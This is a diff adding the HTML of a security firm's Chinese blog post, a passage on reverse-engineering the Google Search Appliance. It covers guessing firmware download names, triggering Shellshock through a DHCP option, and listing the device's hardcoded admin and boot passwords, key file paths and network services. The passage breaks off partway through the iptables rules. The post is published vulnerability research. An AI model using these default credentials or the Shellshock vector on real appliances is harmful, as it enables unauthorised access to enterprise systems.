@@ -1,0 +1,1645 @@
+
+
+<!DOCTYPE html>
+<html class="no-js sub-menu">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta charset="utf-8" />
+    <link href="/images/favicon.png" rel="icon" size="32x32">
+    <!-- web fullscreen -->
+    <meta name="apple-mobile-web-app-capable" content="yes"><!-- ios -->
+    <meta name="mobile-web-app-capable" content="yes"><!-- android -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=0" />
+    <meta name="format-detection" content="telephone=no">
+    <title>[REL] 深入破解 Google Search Appliance | DEVCORE 戴夫寇爾</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <script src="/js/modernizr-custom.js"></script>
+    <script src="/js/jquery-3.6.0.min.js"></script>
+    <script src="/js/site.js"></script>
+    <meta name="description" property="og:description" content="Google Search Appliance (以下簡稱 GSA ) 是 Google 於2002 年開始為企業推出的搜尋設備，主要功能為放置於企業內網用於索引內部網路資訊並提供檢索。" />
+    <meta name="keywords" content="Google,GSA,Blog,research" />
+    <meta property="og:site_name" content="DEVCORE 戴夫寇爾" />
+    <meta property="og:title" content="[REL] 深入破解 Google Search Appliance | DEVCORE 戴夫寇爾" />
+    <meta property="og:url" content="https://devco.re/blog/2023/07/07/a-journey-into-hacking-google-search-appliance/" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="https://devco.re/assets/img/blog/20230707/1.png" />
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="d3vc0r3">
+    <meta name="twitter:title" content="[REL] 深入破解 Google Search Appliance | DEVCORE 戴夫寇爾">
+    <meta name="twitter:description" content="Google Search Appliance (以下簡稱 GSA ) 是 Google 於2002 年開始為企業推出的搜尋設備，主要功能為放置於企業內網用於索引內部網路資訊並提供檢索。">
+    <meta name="twitter:creator" content="d3vc0r3">
+    <meta name="twitter:image:src" content="https://devco.re/assets/img/blog/20230707/1.png">
+    <meta name="twitter:domain" content="devco.re">
+    <meta name="google-site-verification" content="lMNi_XT6UmeGqeYI_vLHu5PDRi_uNVfnA2NdDGS4-lM" />
+    <meta name="msvalidate.01" content="119FDBB7730BE45B162515BBB1FF6B33" />
+    <meta name="alexaVerifyID" content="j-Es9N9SD7ckfA2EokOz9SZzhok" />
+    <meta name='yandex-verification' content='4561963cf1d18fe3' />
+    <meta property="fb:admins" content="120968921404653" />
+
+    <link rel="canonical" href="https://devco.re/blog/2023/07/07/a-journey-into-hacking-google-search-appliance/"/>
+    <link rel="alternate" type="application/rss+xml" title="DEVCORE 戴夫寇爾" href="https://devco.re/rss">
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-GHXJ9PS005"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'G-GHXJ9PS005');
+    </script>
+    <link rel="stylesheet" href="/fonts/inter.css" />
+    <link rel="stylesheet" href="/css/highlighter.css" />
+    <!-- <script src="https://cdn.jsdelivr.net/gh/google/code-prettify@master/loader/run_prettify.js"></script> -->
+</head>
+<body>
+    <!-- 導覽列 start -->
+    <header class="header">
+<div class="container">
+    <!-- logo start -->
+    <div class="logo">
+        <a href="/">
+            <img src="/images/logo.svg"/>
+        </a>
+    </div>
+    <!-- logo end -->
+    <!-- 主選單 start -->
+    <nav class="nav">
+        <ul class="menu">
+            <li class="dropdown">
+                <div class="menuLable">
+                    <span>服務<i class="icon arrow_down"></i></span>
+
+                    <div class="menuItem">
+                        <a href="/services/red-team/">
+                            <div class="item">
+
+                                <h2>
+                                    <i class="icon menu service-red-team"></i>
+                                    紅隊演練
+                                </h2>
+                                <p class="two-line">
+                                    在不影響企業營運前提下，無所不用其極，從各種進入點執行模擬入侵攻擊，達成企業指定的演練情境。
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/services/penetration-test/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu service-penetration-test"></i>
+                                    滲透測試
+                                </h2>
+                                <p class="two-line">
+                                    以駭客思維及手法嘗試入侵企業指定系統，找出潛在漏洞，驗證企業資料與設備是否可被竊取或破壞。
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/services/security-consulting/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu service-security-consulting"></i>
+                                    資安顧問服務
+                                </h2>
+                                <p class="two-line">
+                                    以紅隊演練為基礎，提供攻擊者視角與可能入侵路徑，協助企業評估資安資源優先順序，並擬定長期防禦策略。
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/services/security-training/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu service-security-training"></i>
+                                    資安教育訓練
+                                </h2>
+                                <p class="two-line">
+                                    從攻擊思維出發，協助企業有效預防資安事故並防禦；以及事件發生時，如何快速判定攻擊目的、手法、漏洞與及應變方式。
+                                </p>
+                            </div>
+                        </a>
+
+                    </div>
+                </div>
+            </li>
+
+            <li class="dropdown">
+                <div class="menuLable">
+                    <span>研究<i class="icon arrow_down"></i></span>
+
+                    <div class="menuItem">
+                        <a href="/research/overview/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu search-circle"></i>
+                                    總覽概要
+                                </h2>
+                                <p class="two-line">
+                                    持續精研資安最新技術及漏洞研究趨勢，全方位檢測企業產品安全性、吸取經驗並轉化為紅隊演練工具與手法。
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/research/awards/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu badge-check"></i>
+                                    競賽與獎項
+                                </h2>
+                                <p class="two-line">
+                                    國際級資訊安全競賽獎項肯定。
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/research/bug-bounty/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu puzzle"></i>
+                                    企業漏洞回報
+                                </h2>
+                                <p class="two-line">
+                                    研究企業系統中的資安風險及各種可能的突破口，並通報企業修補。
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/research/talks/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu globe"></i>
+                                    國際研討會
+                                </h2>
+                                <p class="two-line">
+                                    參與全球資安盛會，發表、交流漏洞的知識與資訊。
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/research/cve/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu view-list"></i>
+                                    CVE 漏洞列表
+                                </h2>
+                                <p class="two-line">
+                                    挖掘並回報國際知名產品與服務的重大漏洞。
+                                </p>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+
+
+            </li>
+
+            <li class="dropdown">
+                <div class="menuLable" href="#">
+                    <span>公司<i class="icon arrow_down"></i></span>
+
+                    <div class="menuItem">
+                        <a href="/company/about/">
+                        <div class="item">
+                            <h2>
+                                <i class="icon menu company"></i>
+                                公司簡介
+                            </h2>
+                            <p>
+                                DEVCORE 戴夫寇爾由世界級白帽駭客團隊創立，提供紅隊演練、滲透測試、資安顧問服務、資安教育訓練等服務。
+                            </p>
+                        </div>
+                        </a>
+                        <a href="/company/our-team/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu team"></i>
+                                    團隊成員
+                                </h2>
+                                <p class="two-line">
+                                    由熱衷挑戰、具備駭客思維的資安專家組成，專注於創新攻擊手法研究，並以「高道德、高自律、高嚴謹」為最高指導原則。
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/company/history/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu milestone"></i>
+                                    成就與沿革
+                                </h2>
+                                <p class="two-line">
+                                    長期聚焦於攻擊研究，屢屢獲邀參與全球知名資安研討會，已揭露數百個重要產品漏洞、協助企業提升防禦能量。
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/company/csr/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu heart"></i>
+                                    企業社會責任
+                                </h2>
+                                <p class="two-line">
+                                    提供多元實習管道和研習計畫，提升新世代人才資安能量，推廣資訊安全意識。
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/company/jobs/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu briefcase"></i>
+                                    工作機會
+                                </h2>
+                                <p class="two-line">
+                                    加入 DEVCORE，共同改善資安產業結構，與我們一起打造更安全的世界。
+                                </p>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+            </li>
+            <li class="dropdown">
+                <div class="menuLable">
+                    <span>新聞<i class="icon arrow_down"></i></span>
+                    <div class="menuItem">
+                        <a href="/blog/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu newspaper"></i>
+                                    BLOG
+                                </h2>
+                                <p>
+                                    DEVCORE 最新消息。
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/media-kit/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu download"></i>
+                                    媒體素材下載
+                                </h2>
+                                <p>
+                                    使用 DEVCORE 商標須遵循的使用規範。
+                                </p>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+            </li>
+            <li>
+                <a class="menuLable" href="/search/">搜尋</a>
+            </li>
+            <li>
+                <a class="menuLable" href="/contact/">聯絡我們</a>
+            </li>
+        </ul>
+    </nav>
+    <!-- 主選單 end -->
+</div>
+
+
+<!-- 手機板選單  start-->
+<nav class="nav-m" id="menu-m">
+    <ul class="menu">
+        <li>
+            <div class="menuLable">
+                <span>服務</span>
+                <div class="menuItem">
+                    <a href="/services/red-team/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-red-team"></i>
+                                紅隊演練
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/services/penetration-test/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-penetration-test"></i>
+                                滲透測試
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/services/security-consulting/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-security-consulting"></i>
+                                顧問服務
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/services/security-training/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-security-training"></i>
+                                教育訓練
+                            </h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <span>資安研究</span>
+                <div class="menuItem">
+                    <a href="/research/overview/" class="fullwidth">
+                        <div class="item">
+                            <h2>總覽概要</h2>
+                        </div>
+                    </a>
+                    <a href="/research/awards/">
+                        <div class="item">
+                            <h2>競賽與獎項</h2>
+                        </div>
+                    </a>
+                    <a href="/research/bug-bounty/">
+                        <div class="item">
+                            <h2>Bug Bounty</h2>
+                        </div>
+                    </a>
+                    <a href="/research/talks/">
+                        <div class="item">
+                            <h2>國際研討會</h2>
+                        </div>
+                    </a>
+                    <a href="/research/cve/">
+                        <div class="item">
+                            <h2>CVE 漏洞列表</h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+
+        <li>
+            <div class="menuLable">
+                <span>公司</span>
+                <div class="menuItem">
+                    <a href="/company/about/" class="fullwidth">
+                        <div class="item">
+                            <h2>公司簡介</h2>
+                        </div>
+                    </a>
+                    <a href="/company/our-team/">
+                        <div class="item">
+                            <h2>團隊成員</h2>
+                        </div>
+                    </a>
+                    <a href="/company/history/">
+                        <div class="item">
+                            <h2>成就與沿革</h2>
+                        </div>
+                    </a>
+                    <a href="/company/csr/">
+                        <div class="item">
+                            <h2>企業社會責任</h2>
+                        </div>
+                    </a>
+                    <a href="/company/jobs/">
+                        <div class="item">
+                            <h2>工作機會</h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <span>新聞</span>
+                <div class="menuItem">
+                    <!-- <a href="/blog/">
+                    <div class="item">
+                        <h2>所有文章</h2>
+                    </div>
+                    </a> -->
+                    <!-- <a href="">
+                        <div class="item">
+                            <h2>案例剖析</h2>
+                        </div>
+                    </a> -->
+                    <!-- <a href="">
+                        <div class="item">
+                            <h2>科普文章</h2>
+                        </div>
+                    </a>
+                    <a href="">
+                        <div class="item">
+                            <h2>技術專欄</h2>
+                        </div>
+                    </a>
+                    <a href="">
+                        <div class="item">
+                            <h2>資安新聞</h2>
+                        </div>
+                    </a> -->
+                    <a href="/blog/">
+                        <div class="item">
+                            <h2>BLOG</h2>
+                        </div>
+                    </a>
+                    <a href="/media-kit/">
+                        <div class="item">
+                            <h2>媒體素材下載</h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <div class="menuItem">
+                    <a href="/search/" class="fullwidth">
+                        <div class="item">
+                            <h2 class="center">
+                                <i class="icon search"></i>
+                                搜尋
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/contact/" class="fullwidth">
+                        <div class="item">
+                            <h2 class="center">
+                                <i class="icon chat-alt"></i>
+                                聯絡我們
+                            </h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <span><i class="icon translate"></i>Language</span>
+                <div class="menuItem">
+                    <a href="/">
+                    <div class="item">
+                        <h2>中文</h2>
+                    </div>
+                    </a>
+                    <a href="/en">
+                        <div class="item">
+                            <h2>English</h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+    </ul>
+</nav>
+<!-- 手機板選單  end-->
+    </header>
+    <!-- 導覽列 end -->
+
+    <!-- tab 選單 start -->
+    <div class="sub-nav">
+        <div class="container">
+            <h1>BLOG</h1>
+            <ul class="tab">
+                <li>
+                    <a href="/blog/">所有文章</a>
+                </li>
+                <li>
+                    <a href="/blog/category/最新消息/">最新消息</a>
+                </li>
+                <li>
+                    <a href="/blog/category/技術專欄/">技術專欄</a>
+                </li>
+                <li>
+                    <a href="/blog/category/科普文章/">科普文章</a>
+                </li>
+                <li>
+                    <a href="/blog/category/資安新聞/">資安新聞</a>
+                </li>
+                <li>
+                    <a href="/media-kit/">媒體素材下載</a>
+                </li>
+            </ul>
+        </div>
+    </div>
+    <!-- tab 選單 end -->
+    
+    <div class="main">
+        <!-- 文章外層layer -->
+        <section class="narrow">
+            <!-- 文章 start -->
+            <article class="article_body">
+                <div class="content">
+                    <a class="category" href="/blog/category/技術專欄">技術專欄</a>
+                    <span class="tag">
+
+                      <a href="/blog/tag/Google, LFI, Shell/">#Google, LFI, Shell</a> 
+                    </span>
+                    <h1>
+                        [REL] 深入破解 Google Search Appliance
+                    </h1>
+                    
+                    
+                    <div class="author_detail">
+                        <span class="date">2023-07-07</span>
+                    </div>         
+                    
+                    
+                    <div class="article_img">
+                        <img src="https://devco.re/assets/img/blog/20230707/1.png"/>
+                    </div>
+                    
+
+                    <hr>
+
+                    <!-- 文章內容 -->
+                    <div class="article_content">
+<p><a href="/blog/2023/07/07/a-journey-into-hacking-google-search-appliance-en">English Version</a>, <a href="/blog/2023/07/07/a-journey-into-hacking-google-search-appliance/">中文版本</a></p>
+
+<h3 id="懶人包">懶人包</h3>
+
+<ul>
+  <li>GSA 管理界面認證後任意指令執行</li>
+  <li>GSA 搜尋介面任意讀檔</li>
+  <li>GSA 使用 Oracle 的 Outside-in Technology 轉換文件格式</li>
+  <li>Google 網頁服務有一些固定的URI，會提供此服務的自身資訊</li>
+</ul>
+
+<h3 id="前言">前言</h3>
+
+<p>Google Search Appliance (以下簡稱 GSA ) 是 Google 於2002 年開始為企業推出的搜尋設備，主要功能為放置於企業內網用於索引內部網路資訊並提供檢索。於 2005 年左右推出給個人及小型企業使用的 Google Mini，於 2008 年底左右有發布虛擬機器版本，名稱為 Virtual Google Search Appliance (以下簡稱 vGSA)，後來於 2018年底結束產品生命週期，產品線整合進入 Cloud Search。</p>
+
+<h3 id="設備軟體取得">設備、軟體取得</h3>
+
+<p>從 ebay 以關鍵字 Google Search Appliance 搜尋並嘗試購買此設備，
+如果不幸硬碟資料已被清除，也只能嘗試多買幾台了。</p>
+
+<p>幸運的是，購入的第一台就是未遭完整清除的 GSA：</p>
+
+<p><img src="/assets/img/blog/20230707/1.png" alt="" /></p>
+
+<p>現在仍然可以找到正在被販售的設備：</p>
+
+<p><img src="/assets/img/blog/20230707/2.png" alt="" /></p>
+
+<p>另一方面 vGSA 原始公開連結已被移除，
+<code class="language-plaintext highlighter-rouge">http://dl.google.com/vgsa/vgsa\_20090210.7z</code> [已被移除]
+<code class="language-plaintext highlighter-rouge">http://dl.google.com/vgsa/vgsa\_20081028.7z</code> [已被移除]</p>
+
+<p>後來用 BitTorrent 磁力連結 <code class="language-plaintext highlighter-rouge">magnet:?xt=urn:btih:89388ACE8C3B91FDD3A2F86D8CBB78C58A70D992</code> 成功取得檔案。</p>
+
+<p>接著再從 google groups 中找到舊版軟體連接：<code class="language-plaintext highlighter-rouge">https://groups.google.com/g/google-search-appliance-help/c/Qn5aO5r2Joo/m/PTw8ZDWu6vYJ</code></p>
+
+<p><img src="/assets/img/blog/20230707/3.png" alt="" /></p>
+
+<p>連結為：<code class="language-plaintext highlighter-rouge">http://dl.google.com/dl/enterprise/install_bundle-10000622-7.2.0-112.bin</code> [已被移除]</p>
+
+<p>由公開網頁中，可取得版本號碼：
+<a href="http://web.archive.org/web/20210116194907/https://support.google.com/gsa/answer/7020590?hl=en&amp;ref_topic=2709671">http://web.archive.org/web/20210116194907/https://support.google.com/gsa/answer/7020590?hl=en&amp;ref_topic=2709671</a></p>
+
+<p>猜測檔案名稱規則為 install_bundle-10000(三位數字)-7.(一位數字).(數字)-(三位數字).bin</p>
+
+<p>並編寫 shell script 嘗試下載：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span><span class="o">((</span><span class="nv">j</span><span class="o">=</span>622<span class="p">;</span>j&lt;999<span class="p">;</span>+j<span class="o">))</span><span class="p">;</span><span class="k">do for</span><span class="o">((</span><span class="nv">i</span><span class="o">=</span>1<span class="p">;</span>i&lt;444<span class="p">;</span>+i<span class="o">))</span><span class="p">;</span><span class="k">do </span>wget http://dl.google.com/dl/enterprise/install_bundle-10000<span class="nv">$j</span><span class="nt">-7</span>.2.0-<span class="nv">$i</span>.bin<span class="p">;</span><span class="k">done</span><span class="p">;</span><span class="k">done
+for</span><span class="o">((</span><span class="nv">j</span><span class="o">=</span>661<span class="p">;</span>j&lt;999<span class="p">;</span>+j<span class="o">))</span><span class="p">;</span><span class="k">do for</span><span class="o">((</span><span class="nv">i</span><span class="o">=</span>1<span class="p">;</span>i&lt;444<span class="p">;</span>+i<span class="o">))</span><span class="p">;</span><span class="k">do </span>wget http://dl.google.com/dl/enterprise/install_bundle-10000<span class="nv">$j</span><span class="nt">-7</span>.4.0-<span class="nv">$i</span>.bin<span class="p">;</span><span class="k">done</span><span class="p">;</span><span class="k">done
+for</span><span class="o">((</span><span class="nv">j</span><span class="o">=</span>693<span class="p">;</span>j&lt;999<span class="p">;</span>+j<span class="o">))</span><span class="p">;</span><span class="k">do for</span><span class="o">((</span><span class="nv">i</span><span class="o">=</span>1<span class="p">;</span>i&lt;444<span class="p">;</span>+i<span class="o">))</span><span class="p">;</span><span class="k">do </span>wget http://dl.google.com/dl/enterprise/install_bundle-10000<span class="nv">$j</span><span class="nt">-7</span>.6.0-<span class="nv">$i</span>.bin<span class="p">;</span><span class="k">done</span><span class="p">;</span><span class="k">done</span>
+</code></pre></div></div>
+<p>加上網路搜尋到的資料，成功取回以下檔案：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>all_langs-lang-pack-2.1-1.bin
+all_langs-lang-pack-2.2-1.bin
+centos_patch_files-6.0.0-22.bin
+centos_patch_files-6.14.0-28.bin
+centos_patch_files-7.0.14-238.bin
+centos_patch_files-7.2.0-252.bin
+centos_patch_files-7.2.0-264.bin
+centos_patch_files-7.2.0-270.bin
+centos_patch_files-7.2.0-280.bin
+centos_patch_files-7.2.0-286.bin
+install_bundle-10000653-7.2.0-252.bin
+install_bundle-10000658-7.2.0-264.bin
+install_bundle-10000661-7.2.0-270.bin
+install_bundle-10000681-7.4.0-64.bin
+install_bundle-10000685-7.4.0-72.bin
+install_bundle-10000686-7.4.0-74.bin
+install_bundle-10000692-7.4.0-82.bin
+install_bundle-10000762-7.6.0-36.bin
+install_bundle-10000767-7.6.0-42.bin
+install_bundle-10000772-7.6.0-46.bin
+install_bundle-10000781-7.6.0-58.bin
+install_bundle-10000810-7.6.50-30.bin
+install_bundle-10000822-7.6.50-36.bin
+install_bundle-10000855-7.6.50-64.bin
+install_bundle-10000878-7.6.250-12.bin
+install_bundle-10000888-7.6.250-20.bin
+install_bundle-10000901-7.6.250-26.bin
+install_bundle-10000915-7.6.360-10.bin
+install_bundle-10000926-7.6.360-16.bin
+install_bundle-10000967-7.6.512-18.bin
+sw_files-5.0.4-22.bin
+sw_files-6.14.0-28.bin
+sw_files-7.0.14-238.bin
+vm_patch_1_for_504_G22_and_G24_only.bin
+</code></pre></div></div>
+
+<h3 id="vgsa-virtual-google-search-appliance">vGSA (Virtual Google Search Appliance)</h3>
+
+<p>接著開始 VGSA 的研究，預設情況下完成匯入虛擬機後此系統只提供了一個網路設定的功能，
+沒有提供 shell 可供操作使用。但是由於虛擬機器是執行在自己環境上，
+所以通常可以透過下列方式取得系統權限：</p>
+
+<ul>
+  <li>直接修改未加密的磁碟機檔案</li>
+  <li>修改虛擬機記憶體內容</li>
+  <li>使用其他作業系統光碟或磁碟開機</li>
+  <li>其他已知漏洞</li>
+  <li>寫死的管理員或系統帳號、密碼</li>
+</ul>
+
+<p>下圖為 vGSA 網路設定畫面：</p>
+
+<p><img src="/assets/img/blog/20230707/4.png" alt="" /></p>
+
+<h4 id="cve-2014-6271">CVE-2014-6271</h4>
+
+<p>當測試早期的 Linux 設備及服務，尤其是使用 RedHat 系列的作業系統時，通常會有 Shellshock 的漏洞，
+而發布日期再2008的 vGSA 也不例外。dhcp server 中插入 option 114 會被設置於環境變數，從而觸發漏洞，執行任意指令：</p>
+
+<p><img src="/assets/img/blog/20230707/5.png" alt="" /></p>
+
+<p>指令為：<code class="language-plaintext highlighter-rouge">useradd zzzzgsa</code>，可以從主控台輸出中看到此指令被重複執行，並產生錯誤訊息。</p>
+
+<h4 id="vgsa-觀察">vGSA 觀察</h4>
+
+<p>成功取得作業系統權限後，進行網路環境、執行程式、檔案系統的觀察，以下是作業系統環境觀察心得：</p>
+
+<ul>
+  <li>版本號為 5.2.0.G.27。</li>
+  <li>服務主要由 C/C++、java、python 編寫</li>
+  <li>/export/hda3 似乎是服務主要使用的目錄</li>
+  <li>/etc/shadow 存在帳號 root、密碼雜湊為 x███████████M</li>
+  <li>管理介面 8000、8443 預設管理密碼為 j0njlRXpU5CQ</li>
+  <li>/.gnupg 存在 ent_box_key 公私鑰。</li>
+  <li>/.gnupg 存在 google_license_key 公鑰。</li>
+  <li>/.ssh/authorized_keys 存在兩組公鑰。</li>
+  <li>/root/.ssh/authorized_keys 存在一組公鑰。</li>
+  <li>/root/.ssh/ 存在兩組ssh 公私鑰。</li>
+  <li>/root/.gnupg/ 存在 ent_box_key 公私鑰。</li>
+  <li>使用 Oracle 公司的 Outside In Technology 將文件轉換為 html網頁。</li>
+  <li>java 執行環境使用 Security Manager 保護。</li>
+  <li>請求工程師支援功能使用 ppp 建構虛擬私有網路， /etc/ppp/chap-secrets 存有帳號密碼 ( z██████c、]███████T )</li>
+  <li>/etc/lilo.conf中的開機選單密碼為 cmBalx7</li>
+  <li>/export/hda3/versionmanager/google_key.symmetric 有一把疑似為對稱式加密使用的密碼</li>
+  <li>/export/hda3/versionmanager/vmanager_passwd 存在兩組帳密組合 ( admin： M█████████████████████████w=:9██=  google：w█████████████████████████o=:N██=  )</li>
+</ul>
+
+<p>而具有網路服務的執行程式的觀察如下：</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>通訊埠</th>
+      <th>服務名稱</th>
+      <th>程式編寫語言</th>
+      <th>服務說明</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22</td>
+      <td>ssh</td>
+      <td>C/C++</td>
+      <td>OpenSSH Server</td>
+    </tr>
+    <tr>
+      <td>53</td>
+      <td>named</td>
+      <td>C/C++</td>
+      <td>Bind Named</td>
+    </tr>
+    <tr>
+      <td>953</td>
+      <td>named</td>
+      <td>C/C++</td>
+      <td>Bind Named</td>
+    </tr>
+    <tr>
+      <td>1111</td>
+      <td>webserver_config</td>
+      <td>python</td>
+      <td>Installer</td>
+    </tr>
+    <tr>
+      <td>2100</td>
+      <td>adminrunner.py</td>
+      <td>python</td>
+      <td>enterpriseconsole backend</td>
+    </tr>
+    <tr>
+      <td>3990</td>
+      <td>monitor</td>
+      <td>C/C++</td>
+      <td>monitor</td>
+    </tr>
+    <tr>
+      <td>4000</td>
+      <td>rtserver</td>
+      <td>C/C++</td>
+      <td>未知</td>
+    </tr>
+    <tr>
+      <td>4430</td>
+      <td>EnterpriseFrontend</td>
+      <td>Java (with security manager)</td>
+      <td>https 前端</td>
+    </tr>
+    <tr>
+      <td>4911</td>
+      <td>borgmon</td>
+      <td>C/C++</td>
+      <td>borgmon</td>
+    </tr>
+    <tr>
+      <td>4916</td>
+      <td>reactor</td>
+      <td>C/C++</td>
+      <td>未知</td>
+    </tr>
+    <tr>
+      <td>5000</td>
+      <td>rtserver</td>
+      <td>C/C++</td>
+      <td>未知</td>
+    </tr>
+    <tr>
+      <td>5600</td>
+      <td>rtserver</td>
+      <td>C/C++</td>
+      <td>未知</td>
+    </tr>
+    <tr>
+      <td>6600</td>
+      <td>cacheserver</td>
+      <td>C/C++</td>
+      <td>未知</td>
+    </tr>
+    <tr>
+      <td>7800</td>
+      <td>EnterpriseFrontend</td>
+      <td>Java (with security manager)</td>
+      <td>未知</td>
+    </tr>
+    <tr>
+      <td>7880</td>
+      <td>TableServer</td>
+      <td>Java (with security manager)</td>
+      <td>未知</td>
+    </tr>
+    <tr>
+      <td>7882</td>
+      <td>AuthzChecker</td>
+      <td>Java (without security manager)</td>
+      <td>未知</td>
+    </tr>
+    <tr>
+      <td>7886</td>
+      <td>tomcat</td>
+      <td>Java</td>
+      <td>tomcat server</td>
+    </tr>
+    <tr>
+      <td>8000</td>
+      <td>EnterpriseAdminConsole</td>
+      <td>Java (without security manager)</td>
+      <td>未知</td>
+    </tr>
+    <tr>
+      <td>8443</td>
+      <td>stunnel</td>
+      <td>C/C++</td>
+      <td>redirect http to https</td>
+    </tr>
+    <tr>
+      <td>8888</td>
+      <td>GWS</td>
+      <td>C/C++</td>
+      <td>未知</td>
+    </tr>
+    <tr>
+      <td>9300</td>
+      <td>oneboxserver</td>
+      <td>C/C++</td>
+      <td>未知</td>
+    </tr>
+    <tr>
+      <td>9328</td>
+      <td>entspellmixer</td>
+      <td>C/C++</td>
+      <td>未知</td>
+    </tr>
+    <tr>
+      <td>9400</td>
+      <td>mixserver</td>
+      <td>C/C++</td>
+      <td>未知</td>
+    </tr>
+    <tr>
+      <td>9402</td>
+      <td>mixserver</td>
+      <td>C/C++</td>
+      <td>未知</td>
+    </tr>
+    <tr>
+      <td>9448</td>
+      <td>qrewrite</td>
+      <td>C/C++</td>
+      <td>未知</td>
+    </tr>
+    <tr>
+      <td>9450</td>
+      <td>EnterpriseAdminConsole</td>
+      <td>Java (without security manager )</td>
+      <td>未知</td>
+    </tr>
+    <tr>
+      <td>10094</td>
+      <td>enterprise_onebox</td>
+      <td>C/C++</td>
+      <td>未知</td>
+    </tr>
+    <tr>
+      <td>10200</td>
+      <td>clustering_server</td>
+      <td>C/C++</td>
+      <td>未知</td>
+    </tr>
+    <tr>
+      <td>11913</td>
+      <td>sessionmanager</td>
+      <td>C/C++</td>
+      <td>未知</td>
+    </tr>
+    <tr>
+      <td>12345</td>
+      <td>RegistryServer</td>
+      <td>Java (without security manager)</td>
+      <td>未知</td>
+    </tr>
+    <tr>
+      <td>19780</td>
+      <td>configmgr/ent_configmgr.py</td>
+      <td>python</td>
+      <td>未知</td>
+    </tr>
+    <tr>
+      <td>19900</td>
+      <td>feedergate</td>
+      <td>C/C++</td>
+      <td>未知</td>
+    </tr>
+    <tr>
+      <td>21200</td>
+      <td>FileSystemGateway</td>
+      <td>Java (with security manager)</td>
+      <td>未知</td>
+    </tr>
+    <tr>
+      <td>31300</td>
+      <td>rtserver</td>
+      <td>C/C++</td>
+      <td>未知</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>雖然有這麼多服務，但是 iptables 阻擋了大部分的連線，以下是 iptables 設定：</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Redirect privileged ports.</span>
+<span class="c"># (we listen as nobody, which can't attach to low ports, so redirect to high ports)</span>
+<span class="c">#</span>
+<span class="nt">-A</span> PREROUTING <span class="nt">-i</span> eth0 <span class="nt">-p</span> tcp <span class="nt">-m</span> tcp <span class="nt">--dport</span> 80 <span class="nt">-j</span> REDIRECT <span class="nt">--to-ports</span> 7800
+<span class="nt">-A</span> PREROUTING <span class="nt">-i</span> eth0 <span class="nt">-p</span> tcp <span class="nt">-m</span> tcp <span class="nt">--dport</span> 443 <span class="nt">-j</span> REDIRECT <span class="nt">--to-ports</span> 4430
+<span class="nt">-A</span> PREROUTING <span class="nt">-i</span> eth0 <span class="nt">-p</span> tcp <span class="nt">-m</span> tcp <span class="nt">--dport</span> 444 <span class="nt">-j</span> REDIRECT <span class="nt">--to-ports</span> 4431
+<span class="nt">-A</span> INPUT <span class="nt">-i</span> eth0 <span class="nt">-p</span> udp <span class="nt">-m</span> state <span class="nt">--state</span> ESTABLISHED,RELATED <span class="nt">-j</span> ACCEPT
+<span class="nt">-A</span> INPUT <span class="nt">-i</span> eth0 <span class="nt">-p</span> tcp <span class="nt">-m</span> tcp <span class="nt">--dport</span> 22 <span class="nt">-j</span> ACCEPT
